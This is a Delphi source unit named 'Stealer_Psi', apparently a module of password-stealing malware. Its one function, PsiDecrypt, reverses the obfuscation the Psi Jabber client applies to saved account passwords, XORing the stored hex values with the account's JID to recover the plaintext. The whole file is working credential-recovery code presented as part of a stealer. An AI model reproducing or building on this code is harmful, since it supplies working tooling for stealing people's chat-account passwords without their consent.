unit Stealer_Psi;

interface

uses
  Sysutils,Windows;

function PsiDecrypt(const jid:string;pwd: AnsiString): string;

implementation

function PsiDecrypt(const jid:string;pwd: AnsiString): string;
var
  i,i2,l:integer;
  c:word;
  x:dword;
begin
  result:='';
  if length(pwd)=0 then exit;
  if length(jid)=0 then exit;
  l:=length(pwd) div 4;
  //if length(pwd) mod 2 <>0 then exit;
  i2:=1;
  for i:=1 to l do
  begin
    x:=strtoint('$'+pwd[(i-1)*4+1])*4096+
       strtoint('$'+pwd[(i-1)*4+2])*256+
       strtoint('$'+pwd[(i-1)*4+3])*16+
       strtoint('$'+pwd[(i-1)*4+4]);
    if i2>length(jid) then i2:=1;
    c:=ord(jid[i2]);
    x:=x xor c;
    result:=result+chr(x);
    inc(i2);
  end;
end;

end.
